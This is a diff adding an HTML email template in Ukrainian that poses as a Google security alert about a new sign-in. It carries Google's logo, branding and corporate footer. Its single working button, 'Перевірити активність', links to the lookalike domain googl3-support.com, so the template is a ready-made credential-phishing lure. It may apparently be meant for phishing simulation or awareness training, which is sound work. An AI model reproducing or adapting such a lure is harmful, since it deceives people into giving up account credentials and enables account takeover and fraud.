@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="uk">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>Google Support</title>
+    <style>
+        .email-body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Google Sans', Roboto, sans-serif;
+            background: #ffffff;
+            line-height: 1.6;
+            color: #3c4043;
+        }
+
+        .email-container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: #ffffff;
+        }
+
+        .header-section {
+            padding: 40px 40px 20px 40px;
+            text-align: left;
+            background: #ffffff;
+        }
+
+        .logo {
+            width: 74px;
+            height: auto;
+            margin-bottom: 32px;
+        }
+
+        .content-section {
+            padding: 0 40px 40px 40px;
+            font-size: 14px;
+            color: #3c4043;
+            line-height: 20px;
+        }
+
+        .greeting {
+            font-size: 14px;
+            margin-bottom: 24px;
+            color: #3c4043;
+        }
+
+        .main-message {
+            margin-bottom: 24px;
+            font-size: 14px;
+            line-height: 20px;
+        }
+
+        .security-notice {
+            background: #fef7e0;
+            border: 1px solid #fbbc04;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 24px 0;
+        }
+
+        .notice-title {
+            font-weight: 500;
+            margin-bottom: 8px;
+            color: #3c4043;
+            font-size: 14px;
+        }
+
+        .activity-details {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 24px 0;
+            font-size: 13px;
+            line-height: 18px;
+        }
+
+        .detail-row {
+            margin: 8px 0;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .detail-label {
+            color: #5f6368;
+        }
+
+        .detail-value {
+            color: #3c4043;
+            font-weight: 400;
+        }
+
+        .button-container {
+            margin: 32px 0;
+        }
+
+        .action-button {
+            background: #1a73e8;
+            color: #ffffff;
+            padding: 12px 24px;
+            text-decoration: none;
+            border-radius: 4px;
+            font-weight: 500;
+            font-size: 14px;
+            display: inline-block;
+            letter-spacing: 0.25px;
+        }
+
+        .secondary-info {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 24px 0;
+            font-size: 13px;
+        }
+
+        .info-title {
+            font-weight: 500;
+            margin-bottom: 8px;
+            color: #3c4043;
+        }
+
+        .help-section {
+            margin: 32px 0;
+            padding: 16px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            font-size: 13px;
+        }
+
+        .footer-section {
+            background: #f8f9fa;
+            padding: 24px 40px;
+            font-size: 12px;
+            color: #5f6368;
+            line-height: 16px;
+        }
+
+        .footer-links {
+            margin: 16px 0;
+        }
+
+        .footer-links a {
+            color: #1a73e8;
+            text-decoration: none;
+            margin-right: 16px;
+        }
+
+        .company-info {
+            margin-top: 16px;
+            font-size: 11px;
+            color: #5f6368;
+        }
+
+        .divider {
+            height: 1px;
+            background: #e8eaed;
+            margin: 24px 0;
+            border: none;
+        }
+    </style>
+</head>
+
+<body class="email-body">
+    <table align="center" cellpadding="0" cellspacing="0" width="100%" class="email-container">
+        <tr>
+            <td class="header-section">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google"
+                    class="logo" />
+            </td>
+        </tr>
+        <tr>
+            <td class="content-section">
+                <div class="greeting">Привіт!</div>
+
+                <div class="main-message">
+                    Ми помітили нову активність в акаунті <strong>user.email@gmail.com</strong>. Якщо це були ви, можете
+                    ігнорувати це повідомлення. Якщо ні, ми допоможемо вам захистити акаунт.
+                </div>
+
+                <div class="security-notice">
+                    <div class="notice-title">Перевірка безпеки</div>
+                    <div>Ми зафіксували вхід з нового пристрою та місцезнаходження. Для вашої безпеки рекомендуємо
+                        перевірити цю активність.</div>
+                </div>
+
+                <div class="activity-details">
+                    <div style="font-weight: 500; margin-bottom: 12px;">Деталі входу</div>
+
+                    <div class="detail-row">
+                        <span class="detail-label">Час:</span>
+                        <span class="detail-value">17 серпня 2025, 09:20 (UTC)</span>
+                    </div>
+
+                    <div class="detail-row">
+                        <span class="detail-label">Пристрій:</span>
+                        <span class="detail-value">Windows • Chrome</span>
+                    </div>
+
+                    <div class="detail-row">
+                        <span class="detail-label">Місцезнаходження:</span>
+                        <span class="detail-value">Київ, Україна</span>
+                    </div>
+
+                    <div class="detail-row">
+                        <span class="detail-label">IP-адреса:</span>
+                        <span class="detail-value">185.234.xxx.xxx</span>
+                    </div>
+                </div>
+
+                <div class="button-container">
+                    <a href="https://googl3-support.com/security/check" class="action-button">
+                        Перевірити активність
+                    </a>
+                </div>
+
+                <hr class="divider">
+
+                <div class="secondary-info">
+                    <div class="info-title">Що робити далі</div>
+                    <div>Якщо ви не впізнаєте цю активність:</div>
+                    <ul style="margin: 8px 0; padding-left: 16px;">
+                        <li>Перегляньте нещодавню активність акаунта</li>
+                        <li>Змініть пароль</li>
+                        <li>Увімкніть двоетапну перевірку</li>
+                        <li>Видаліть незнайомі пристрої</li>
+                    </ul>
+                </div>
+
+                <div class="help-section">
+                    <div class="info-title">Потрібна допомога?</div>
+                    <div>Якщо ви не можете отримати доступ до свого акаунта або маєте запитання щодо безпеки, відвідайте
+                        <a href="#" style="color: #1a73e8;">Центр довіри Google</a>.</div>
+                </div>
+
+                <div style="margin-top: 32px; font-size: 13px; color: #5f6368;">
+                    Команда Google Workspace<br>
+                    <div style="margin-top: 8px; font-size: 12px;">
+                        Це автоматичне повідомлення. Будь ласка, не відповідайте на цей електронний лист.
+                    </div>
+                </div>
+            </td>
+        </tr>
+        <tr>
+            <td class="footer-section">
+                <div class="footer-links">
+                    <a href="#">Центр довіри</a>
+                    <a href="#">Конфіденційність</a>
+                    <a href="#">Умови використання</a>
+                </div>
+
+                <div class="company-info">
+                    Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043, США
+                    <br><br>
+                    Ви отримали цей лист, оскільки у вас є акаунт Google. Керування налаштуваннями сповіщень можна
+                    здійснити в <a href="#" style="color: #1a73e8;">акаунті Google</a>.
+                </div>
+            </td>
+        </tr>
+    </table>
+</body>
+
+</html>
